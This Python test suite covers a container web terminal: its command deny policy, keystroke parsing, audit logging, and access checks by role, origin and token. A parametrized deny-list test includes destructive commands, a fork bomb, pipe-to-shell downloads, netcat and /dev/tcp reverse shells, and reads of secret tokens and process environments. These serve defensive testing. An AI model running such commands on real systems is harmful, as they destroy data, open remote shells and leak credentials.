"""Терминал в контейнер: политика команд и доступ (ТЗ, п. 11.4)."""
import asyncio
import contextlib
import json
import time
from collections.abc import AsyncIterator
from typing import Any

import httpx
import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from coordinator.api.app import create_app
from coordinator.api.terminal import CLOSE_FORBIDDEN, CLOSE_NOT_FOUND, CLOSE_UNAUTHORIZED
from coordinator.config import Settings
from coordinator.domain.terminal import KILL_LINE, CommandLine, denied_reason
from coordinator.runner.app import create_runner_app
from coordinator.runner.docker import DockerClient
from coordinator.runner.service import Runner
from coordinator.runner_client import RunnerClient
from tests.conftest import PASSWORD, login
from tests.helpers import register, sql

ORIGIN = {"origin": "http://testserver"}


@pytest.mark.parametrize("command", [
    "rm -rf /", "rm -rf /*", "rm -fr /", "rm -r -f /", "sudo rm -rf / ", "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda", "shutdown -h now", "reboot", ":(){ :|:& };:",
    "chmod -R 777 /", "curl http://x/y | sh", "wget -qO- http://x | bash",
    "nc -e /bin/sh 1.2.3.4 5", "cat /run/secrets/worker_01_token", "cat /proc/1/environ",
    "bash -i >& /dev/tcp/1.2.3.4/5 0>&1",
])
def test_dangerous_commands_are_denied(command: str) -> None:
    assert denied_reason(command) is not None


@pytest.mark.parametrize("command", [
    "ls -la", "rm -rf /data/videos/tmp", "rm file", "cat /etc/hostname", "ps aux", "df -h",
    "curl http://x/y", "echo hello", "dd --version",
])
def test_ordinary_commands_are_allowed(command: str) -> None:
    assert denied_reason(command) is None


def feed(text: str | bytes) -> Any:
    data = text.encode() if isinstance(text, str) else text
    return CommandLine().feed(data)


def test_command_is_collected_and_forwarded() -> None:
    result = feed("ls -la\r")
    assert result.commands == ("ls -la",)
    assert result.forward == b"ls -la\r"
    assert not result.denied


def test_denied_command_never_gets_enter() -> None:
    result = feed("rm -rf /\r")
    assert [c for c, _ in result.denied] == ["rm -rf /"]
    assert not result.commands
    assert b"\r" not in result.forward
    assert result.forward.endswith(KILL_LINE), "строка стёрта в оболочке"


def test_command_split_between_messages() -> None:
    parser = CommandLine()
    assert parser.feed(b"rm -r").commands == ()
    assert parser.feed(b"f /").denied == ()
    assert parser.feed(b"\r").denied[0][0] == "rm -rf /"


def test_backspace_edits_the_line() -> None:
    assert feed(b"lsx\x7f\r").commands == ("ls",)


def test_backspace_removes_whole_cyrillic_letter() -> None:
    assert feed("echo яю\x7f\r").commands == ("echo я",)


def test_edit_turning_safe_into_dangerous_is_seen() -> None:
    assert feed(b"rm -rf /tmp\x7f\x7f\x7f\r").denied[0][0] == "rm -rf /"


@pytest.mark.parametrize("control", [b"\x03", b"\x15"])
def test_ctrl_c_and_ctrl_u_reset_the_line(control: bytes) -> None:
    result = feed(b"rm -rf /" + control + b"ls\r")
    assert result.commands == ("ls",)
    assert not result.denied


def test_arrow_keys_do_not_pollute_the_line() -> None:
    result = feed(b"\x1b[A\x1b[Dls\r")
    assert result.commands == ("ls",)
    assert result.forward.startswith(b"\x1b[A")


def test_empty_enter_is_not_a_command() -> None:
    result = feed(b"\r")
    assert not result.commands
    assert result.forward == b"\r"


class FakeBackend:
    """Вместо runner-а: эхо ввода и журнал присланного."""

    def __init__(self) -> None:
        self.sent: list[Any] = []
        self.output: asyncio.Queue[Any] = asyncio.Queue()
        self.output.put_nowait(b"$ ")

    async def send(self, data: Any) -> None:
        self.sent.append(data)
        if isinstance(data, bytes):
            self.output.put_nowait(data)

    def __aiter__(self) -> "FakeBackend":
        return self

    async def __anext__(self) -> Any:
        return await self.output.get()


class FakeRunner(RunnerClient):
    def __init__(self, fail: Exception | None = None) -> None:
        super().__init__("http://runner", "t")
        self.backend = FakeBackend()
        self.opened: list[str] = []
        self.fail = fail

    @contextlib.asynccontextmanager
    async def terminal(self, worker: str) -> AsyncIterator[FakeBackend]:
        if self.fail:
            raise self.fail
        self.opened.append(worker)
        yield self.backend


@pytest.fixture
def runner() -> FakeRunner:
    return FakeRunner()


@pytest.fixture
def admin(clean_db: None, runner: FakeRunner) -> Any:
    settings = Settings(terminal_idle_seconds=30, terminal_max_seconds=30)
    with TestClient(create_app(settings, runner=runner)) as client:
        client.headers["X-Agent-Token"] = "test-fleet-token"
        login(client)
        yield client


def connect(client: TestClient, worker: int, headers: dict[str, str] | None = None) -> Any:
    return client.websocket_connect(
        f"/api/workers/{worker}/terminal", headers=ORIGIN if headers is None else headers,
    )


def closed_with(client: TestClient, worker: int, headers: dict[str, str] | None = None) -> int:
    with pytest.raises(WebSocketDisconnect) as caught, connect(client, worker, headers):
        pass
    return caught.value.code


def audit_rows() -> list[tuple[str, str, str]]:
    return [tuple(r) for r in sql(
        "SELECT action, object, result FROM audit_log WHERE action LIKE 'terminal%' ORDER BY id"
    )]


def audit_rows_after_close() -> list[tuple[str, str, str]]:
    """Клиент уже закрыл соединение, а сервер дописывает журнал чуть позже."""
    deadline = time.monotonic() + 3
    while time.monotonic() < deadline:
        rows = audit_rows()
        if rows and rows[-1][0] == "terminal.close":
            return rows
        time.sleep(0.02)
    return audit_rows()


@pytest.mark.integration
class TestTerminalAccess:
    def test_admin_gets_session_and_io_is_bridged(
        self, admin: TestClient, runner: FakeRunner,
    ) -> None:
        worker = register(admin)
        with connect(admin, worker) as ws:
            assert ws.receive_bytes() == b"$ "
            ws.send_bytes(b"ls\r")
            assert ws.receive_bytes() == b"ls\r"
        assert runner.opened == ["worker-01"]
        assert b"ls\r" in runner.backend.sent

    def test_session_and_commands_are_audited(self, admin: TestClient) -> None:
        worker = register(admin)
        with connect(admin, worker) as ws:
            ws.receive_bytes()
            ws.send_bytes(b"ls -la\r")
            ws.receive_bytes()
            # Выход из контекста снимает задачу приложения: ждём записи, пока она ещё живёт.
            ws.close()
            rows = audit_rows_after_close()
        assert ("terminal.open", f"worker_id={worker}", "accepted") in rows
        assert ("terminal.command", f"worker_id={worker}", "ls -la") in rows
        assert rows[-1][0] == "terminal.close"

    def test_secret_in_command_is_masked_in_audit(self, admin: TestClient) -> None:
        worker = register(admin)
        with connect(admin, worker) as ws:
            ws.receive_bytes()
            ws.send_bytes(b"export TOKEN=hunter2\r")
            ws.receive_bytes()
        assert "hunter2" not in str(audit_rows())

    def test_denied_command_is_not_executed_and_is_audited(
        self, admin: TestClient, runner: FakeRunner,
    ) -> None:
        worker = register(admin)
        with connect(admin, worker) as ws:
            ws.receive_bytes()
            ws.send_bytes(b"rm -rf /\r")
            notice = ws.receive_text()
            assert "запрещена" in notice
        assert not any(b"\r" in s for s in runner.backend.sent if isinstance(s, bytes))
        assert any(row[0] == "terminal.denied" for row in audit_rows())

    def test_resize_reaches_backend_and_garbage_is_dropped(
        self, admin: TestClient, runner: FakeRunner,
    ) -> None:
        worker = register(admin)
        with connect(admin, worker) as ws:
            ws.receive_bytes()
            ws.send_text('{"resize": [100, 40]}')
            ws.send_text("не json")
            ws.send_text('{"resize": [999999, 1]}')
            ws.send_text('{"exec": "rm"}')
            ws.send_bytes(b"x")
            ws.receive_bytes()
        controls = [json.loads(s) for s in runner.backend.sent if isinstance(s, str)]
        assert controls == [{"resize": [100, 40]}]

    def test_without_login_is_rejected(self, clean_db: None, runner: FakeRunner) -> None:
        with TestClient(create_app(Settings(), runner=runner)) as client:
            assert closed_with(client, 1) == CLOSE_UNAUTHORIZED
        assert runner.opened == []

    @pytest.mark.parametrize("role", ["viewer", "operator"])
    def test_only_administrator_may_open(
        self, admin: TestClient, runner: FakeRunner, role: str,
    ) -> None:
        worker = register(admin)
        admin.post("/api/users", json={"login": role, "password": PASSWORD, "role": role})
        other = TestClient(admin.app)
        other.portal = admin.portal
        login(other, role)
        assert closed_with(other, worker) == CLOSE_FORBIDDEN
        assert runner.opened == []
        assert ("terminal.open", f"worker_id={worker}", "403") in audit_rows()

    @pytest.mark.parametrize("headers", [{}, {"origin": "https://evil.example"}])
    def test_foreign_origin_is_rejected(
        self, admin: TestClient, runner: FakeRunner, headers: dict[str, str],
    ) -> None:
        worker = register(admin)
        assert closed_with(admin, worker, headers) == CLOSE_FORBIDDEN
        assert runner.opened == []

    def test_forwarded_host_from_nginx_is_used_for_origin(self, admin: TestClient) -> None:
        worker = register(admin)
        with connect(admin, worker, {
            "origin": "https://localhost:8443", "x-forwarded-host": "localhost:8443",
        }) as ws:
            assert ws.receive_bytes() == b"$ "

    def test_unknown_worker(self, admin: TestClient) -> None:
        assert closed_with(admin, 999) == CLOSE_NOT_FOUND

    def test_idle_session_is_closed(self, clean_db: None, runner: FakeRunner) -> None:
        settings = Settings(terminal_idle_seconds=0, terminal_max_seconds=30)
        with TestClient(create_app(settings, runner=runner)) as client:
            client.headers["X-Agent-Token"] = "test-fleet-token"
            login(client)
            worker = register(client)
            with connect(client, worker) as ws:
                messages = [ws.receive(), ws.receive()]
        assert any("неактивности" in (m.get("text") or "") for m in messages)
        assert audit_rows_after_close()[-1] == ("terminal.close", f"worker_id={worker}", "idle")

    def test_runner_failure_is_reported_to_user(self, clean_db: None) -> None:
        from coordinator.runner_client import RunnerUnavailable

        failing = FakeRunner(fail=RunnerUnavailable("runner недоступен"))
        with TestClient(create_app(Settings(), runner=failing)) as client:
            client.headers["X-Agent-Token"] = "test-fleet-token"
            login(client)
            worker = register(client)
            with connect(client, worker) as ws:
                assert "недоступен" in ws.receive_text()


class FakeStream:
    def __init__(self) -> None:
        self.written: list[bytes] = []
        self.sizes: list[tuple[int, int]] = []
        self.chunks = [b"prompt$ ", b""]
        self.closed = False

    async def read(self) -> bytes:
        if self.chunks:
            return self.chunks.pop(0)
        await asyncio.sleep(3600)
        return b""

    async def write(self, data: bytes) -> None:
        self.written.append(data)

    async def resize(self, columns: int, rows: int) -> None:
        self.sizes.append((columns, rows))

    async def close(self) -> None:
        self.closed = True


class TestRunnerTerminal:
    @pytest.fixture
    def stream(self) -> FakeStream:
        return FakeStream()

    @pytest.fixture
    def app(self, stream: FakeStream, monkeypatch: pytest.MonkeyPatch) -> Any:
        async def open_terminal(_: Runner, worker: str) -> FakeStream:
            assert worker == "worker-01"
            return stream

        monkeypatch.setattr(Runner, "open_terminal", open_terminal)
        settings = Settings(runner_token="secret")
        return create_runner_app(
            settings, DockerClient(httpx.MockTransport(lambda _: httpx.Response(204))),
        )

    def test_requires_token(self, app: Any, stream: FakeStream) -> None:
        with TestClient(app) as client:
            with pytest.raises(WebSocketDisconnect) as caught, client.websocket_connect(
                "/containers/worker-01/terminal", headers={"X-Runner-Token": "wrong"},
            ):
                pass
        assert caught.value.code == CLOSE_UNAUTHORIZED

    def test_bridges_output_input_and_resize(self, app: Any, stream: FakeStream) -> None:
        with TestClient(app) as client, client.websocket_connect(
            "/containers/worker-01/terminal", headers={"X-Runner-Token": "secret"},
        ) as ws:
            assert ws.receive_bytes() == b"prompt$ "
            ws.send_bytes(b"ls\r")
            ws.send_text('{"resize": [120, 50]}')
            with pytest.raises(WebSocketDisconnect):
                ws.receive_bytes()
        assert stream.closed
